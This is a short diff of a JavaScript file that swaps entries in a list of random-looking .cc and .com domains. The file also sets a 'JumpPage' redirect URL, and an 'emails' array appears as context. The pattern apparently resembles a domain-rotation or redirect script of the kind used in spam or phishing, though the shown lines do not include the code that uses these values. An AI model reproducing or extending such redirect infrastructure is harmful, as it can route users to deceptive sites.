@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[];
-        urls.push(".xgwubmkbz.cc");   
-        urls.push(".wtxgswdzl.com");  
-        urls.push(".psgjqoguj.com");    
+        urls.push(".mhrollcit.cc");   
+        urls.push(".xgwubmkbz.cc");  
+        urls.push(".wtxgswdzl.com");    
         
                      	
 var JumpPage="https://lskiwzcw.cc";
